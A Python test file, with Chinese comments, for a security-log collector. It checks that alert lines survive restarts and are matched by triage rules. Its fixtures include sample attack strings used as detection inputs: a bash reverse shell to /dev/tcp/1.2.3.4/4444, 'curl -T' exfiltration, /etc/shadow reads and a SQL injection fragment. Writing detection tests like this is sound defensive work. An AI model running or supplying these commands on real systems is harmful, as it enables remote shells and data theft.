
from __future__ import annotations

"""log_ops"一条不丢"核心校验 + 存档全量落盘 + triage 初筛 + 状态原子续接。

不丢校验(必做):造一批含已知 ALERT-ID 的日志 → 采集 → 断点(模拟重启,新 store 对象)→
续采 → 断言所有 ALERT-ID 都进了存档 + 候选(一条不丢),且重启不重采已采过的行。
"""

import json
import os
import time
from pathlib import Path

from agent_py_agent.agent.tooling.log_ops.daemon import run_collection_cycle
from agent_py_agent.agent.tooling.log_ops.store import (
    CollectMetrics,
    LogOpsStore,
    SourceSpec,
    build_source_specs,
    source_id_for,
)
from agent_py_agent.agent.tooling.log_ops.triage import (
    extract_alert_id,
    match_rules,
    triage_line,
)


def _alert_line(idx: int, desc: str) -> str:
    return f"2026-06-16T00:00:{idx:02d} ALERT ALERT-{idx:06d} {desc}\n"


def _store(tmp_path: Path) -> LogOpsStore:
    return LogOpsStore(tmp_path / ".log_ops", "m")


# ----------------------- triage 规则库 -----------------------


def test_triage_matches_known_suspicious_patterns() -> None:
    cases = {
        "2026 ALERT ALERT-1 Reverse shell: bash -i >& /dev/tcp/1.2.3.4/4444 0>&1": "reverse_shell",
        "2026 privilege escalation: www-data ran sudo su -": "privilege_escalation",
        "2026 brute force on ssh": "brute_force",
        "2026 sql injection union select * from users": "sql_injection",
        "2026 read /etc/shadow by attacker": "sensitive_file_read",
        "2026 data exfiltration over curl -T secret": "exfiltration",
    }
    for line, expected_rule in cases.items():
        rule_names = [rule.name for rule in match_rules(line)]
        assert expected_rule in rule_names, (line, rule_names)


def _ref(source_id: str = "s", kind: str = "file", locator: str = "/x.log") -> SourceSpec:
    return SourceSpec(kind=kind, locator=locator, source_id=source_id)


def test_triage_benign_line_no_candidate() -> None:
    assert triage_line(
        _ref(locator="x"), line_no=1,
        raw_line="2026-06-16T00:00:01 INFO user alice login ok",
    ) is None


def test_triage_candidate_structure_and_alert_id() -> None:
    cand = triage_line(
        _ref(), line_no=42,
        raw_line="2026-06-16T17:44:27.367997+00:00 ALERT ALERT-000003 Reverse shell: /dev/tcp/1.2.3.4/4444",
    )
    assert cand is not None
    assert cand["alert_id"] == "ALERT-000003"
    assert cand["line_no"] == 42
    assert cand["source_id"] == "s"
    assert "reverse_shell" in cand["matched_rules"]
    assert cand["severity"] == "high"
    assert cand["timestamp"].startswith("2026-06-16T17:44:27")
    assert cand["fingerprint"].startswith("cand-")


def test_extract_alert_id() -> None:
    assert extract_alert_id("x ALERT-000123 y") == "ALERT-000123"
    assert extract_alert_id("no id here") == ""


# ----------------------- 存档全量落盘 -----------------------


def test_archive_captures_every_line(tmp_path: Path) -> None:
    src = tmp_path / "a.log"
    lines = [f"2026-06-16T00:00:{i:02d} INFO line {i}\n" for i in range(20)]
    src.write_text("".join(lines), encoding="utf-8")
    store = _store(tmp_path)
    specs = build_source_specs([str(src)])
    run_collection_cycle(store, specs)
    sid = specs[0].source_id
    # 存档行数 == 源行数(全量落盘,一条不丢)。
    assert store.count_archive_lines(sid) == 20
    archived = store.archive_path(sid).read_text(encoding="utf-8").splitlines()
    assert archived == [ln.rstrip("\n") for ln in lines]


# ----------------------- 不丢校验(必做):断点重启续采 -----------------------


def test_no_loss_across_restart_all_alert_ids_archived_and_candidate(tmp_path: Path) -> None:
    src = tmp_path / "secure.log"
    # 第一批:5 条已知 ALERT-ID + 噪声行。
    batch1 = [
        "2026-06-16T00:00:00 INFO boot ok\n",
        _alert_line(1, "Reverse shell /dev/tcp/1.1.1.1/4444"),
        "2026-06-16T00:00:02 INFO health ok\n",
        _alert_line(3, "privilege escalation sudo su -"),
        _alert_line(4, "brute force ssh"),
        "2026-06-16T00:00:05 INFO metric flush\n",
    ]
    src.write_text("".join(batch1), encoding="utf-8")

    store1 = _store(tmp_path)
    specs1 = build_source_specs([str(src)])
    sid = specs1[0].source_id
    m1 = run_collection_cycle(store1, specs1)
    assert m1.collected_lines == 6
    archive_after_1 = store1.count_archive_lines(sid)

    # ---- 模拟重启:全新 store/specs 对象,只靠落盘状态续接 ----
    # 在"重启"间隙继续写入(含新 ALERT-ID),验证断点续采不丢中间增量。
    batch2 = [
        _alert_line(6, "data exfiltration curl -T"),
        "2026-06-16T00:00:07 INFO ok\n",
        _alert_line(8, "reverse shell again"),
    ]
    with src.open("a", encoding="utf-8") as handle:
        handle.write("".join(batch2))

    store2 = LogOpsStore(tmp_path / ".log_ops", "m")  # 新对象 = 模拟进程重启
    specs2 = build_source_specs([str(src)])
    m2 = run_collection_cycle(store2, specs2)

    # 不重采:存档总行数 = 6 + 3 = 9(不是 6 + 9)。
    assert store2.count_archive_lines(sid) == 9
    assert archive_after_1 == 6

    # 全部已知 ALERT-ID 都进了存档。
    archive_text = store2.archive_path(sid).read_text(encoding="utf-8")
    expected_ids = ["ALERT-000001", "ALERT-000003", "ALERT-000004", "ALERT-000006", "ALERT-000008"]
    for alert_id in expected_ids:
        assert alert_id in archive_text, f"{alert_id} 丢在存档外"

    # 全部已知 ALERT-ID 都产了候选告警。
    candidate_ids = sorted({c["alert_id"] for c in store2.read_candidates() if c["alert_id"]})
    assert candidate_ids == expected_ids, candidate_ids

    # 不丢对账:累计采集行数 == 存档文件行数。
    metrics = CollectMetrics.from_dict(store2.read_metrics())
    assert metrics.collected_lines == 9 == store2.count_archive_lines(sid)


def test_no_loss_three_sources_mixed(tmp_path: Path) -> None:
    # 文件 + 文件夹 两种本地源混采(API 在 collector 测里单独覆盖),验证多源各记各的断点。
    file_src = tmp_path / "f.log"
    file_src.write_text(_alert_line(1, "reverse shell") + "noise\n", encoding="utf-8")
    folder_src = tmp_path / "dir"
    folder_src.mkdir()
    (folder_src / "x.log").write_text(_alert_line(2, "brute force") + "ok\n", encoding="utf-8")

    store = _store(tmp_path)
    specs = build_source_specs([str(file_src), str(folder_src)])
    run_collection_cycle(store, specs)

    file_sid = source_id_for("file", str(file_src))
    folder_sid = source_id_for("folder", str(folder_src))
    assert store.count_archive_lines(file_sid) == 2
    assert store.count_archive_lines(folder_sid) == 2
    ids = sorted({c["alert_id"] for c in store.read_candidates() if c["alert_id"]})
    assert ids == ["ALERT-000001", "ALERT-000002"]


def test_no_loss_folder_subfile_last_line_without_newline(tmp_path: Path) -> None:
    """端到端复现并锁定真 bug:folder 子文件最后一行无换行(写完即固定,模拟器 "\\n".join 风格),
    daemon 一拍后 archive + 候选都必须含最后一行的 ALERT-ID(否则像实测那样永久丢最后一行)。

    用 os.utime 把 mtime 推到过去 → daemon 用真实 time.time() 判定文件已静默 → 采尾段(不改 daemon 签名)。
    """
    folder_src = tmp_path / "slices"
    folder_src.mkdir()
    sub = folder_src / "slice1.log"
    # 最后一行是告警且无换行结尾 —— 正是实测中被永久跳过的那 18 条的形态。
    sub.write_text(
        "2026-06-16T00:00:00 INFO ok1\n2026-06-16T00:00:01 INFO ok2\n"
        "2026-06-16T00:00:02 ALERT ALERT-000099 reverse shell /dev/tcp/9.9.9.9/4444",
        encoding="utf-8",
    )
    old = time.time() - 100.0  # 文件已静默(远超兜底阈值)。
    os.utime(sub, (old, old))

    store = _store(tmp_path)
    specs = build_source_specs([str(folder_src)])
    run_collection_cycle(store, specs)

    folder_sid = source_id_for("folder", str(folder_src))
    # 3 行全进存档(含最后一行无换行的告警),一条不丢。
    assert store.count_archive_lines(folder_sid) == 3
    archive_text = store.archive_path(folder_sid).read_text(encoding="utf-8")
    assert "ALERT-000099" in archive_text, "最后一行(无换行)的告警丢在存档外"
    # 候选队列也必须含它(否则 LLM 永远研判不到这条真威胁)。
    candidate_ids = {c["alert_id"] for c in store.read_candidates() if c["alert_id"]}
    assert "ALERT-000099" in candidate_ids, "最后一行告警没产候选"


# ----------------------- 状态文件原子 + 续接 -----------------------


def test_state_file_atomic_and_readback(tmp_path: Path) -> None:
    store = _store(tmp_path)
    store.write_state("sid-1", {"offset": 123, "size": 123})
    # 落盘是合法 JSON(原子写),无 .tmp 残留。
    state_path = store.state_path("sid-1")
    assert json.loads(state_path.read_text(encoding="utf-8"))["offset"] == 123
    leftovers = list(state_path.parent.glob(".*tmp*"))
    assert leftovers == []
    # 新 store 对象读回同一状态(续接)。
    store2 = LogOpsStore(tmp_path / ".log_ops", "m")
    assert store2.read_state("sid-1")["offset"] == 123


def test_cycle_idempotent_no_new_data(tmp_path: Path) -> None:
    src = tmp_path / "a.log"
    src.write_text("a\nb\n", encoding="utf-8")
    store = _store(tmp_path)
    specs = build_source_specs([str(src)])
    m1 = run_collection_cycle(store, specs)
    sid = specs[0].source_id
    # 第二拍没有新数据 → 存档不增长,候选不增长。
    cand_before = store.count_candidates()
    run_collection_cycle(store, specs)
    assert store.count_archive_lines(sid) == 2
    assert store.count_candidates() == cand_before
